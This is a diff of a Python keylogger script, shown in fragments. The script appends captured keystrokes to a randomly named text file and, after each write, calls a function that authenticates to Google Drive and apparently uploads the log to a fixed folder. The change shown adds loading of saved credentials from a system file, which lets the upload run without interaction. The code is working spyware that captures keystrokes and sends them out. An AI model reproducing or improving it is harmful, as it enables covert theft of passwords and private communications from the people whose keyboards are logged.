@@ -12,7 +12,7 @@ def gerar_nome():
     return name + '-' + direita[random.randint(0, 10)]
 
 
-arquivo = gerar_nome() + '.txt'
+nome_arquivo = gerar_nome() + '.txt'
 
 
 def google_drive():
@@ -21,6 +21,7 @@ def google_drive():
     import os
 
     gauth = GoogleAuth()
+    gauth.LoadCredentialsFile('/etc/atte/credentials.json')
     drive = GoogleDrive(gauth)
 
     folder = '1OvHDaMSzesRWVOC8seuTu7qVLfkmBiu8'
@@ -60,9 +61,8 @@ while True:
         else:
             frase += letra[0]
 
-    keylog = open(arquivo, "a")
+    keylog = open(nome_arquivo, "a")
     keylog.write(frase + '\n')
     keylog.close()
 
     google_drive()
-
